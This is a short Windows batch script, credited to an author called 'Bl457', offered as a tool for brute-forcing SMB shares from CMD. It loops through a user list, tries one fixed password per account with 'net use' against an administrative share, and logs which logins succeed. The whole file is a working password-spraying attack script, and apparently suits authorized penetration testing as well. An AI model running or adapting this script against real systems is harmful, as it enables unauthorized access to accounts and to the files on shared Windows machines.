rem This program is for brute forcing SMB shares when you're desperate enough to turn to CMD
rem This tool was shamefully written by Bl457...
rem all credit to Bl457


rem Firstly provide the userlist;
set userlist=Users.txt

rem Then set the password to try;
set password=Password1

rem Then, finally, set the SMB location;
set smbLoc=\\127.0.0.1\c$

for /F "tokens=1,2,3" %%i in (%userlist%) do call :process %%i %%j %%k
goto thenextstep
:process
set username=%1
echo %username% >> "results.txt"
net use %smbLoc% /user:%username% "%password%" 1>> "results.txt" 2>>&1
:thenextstep
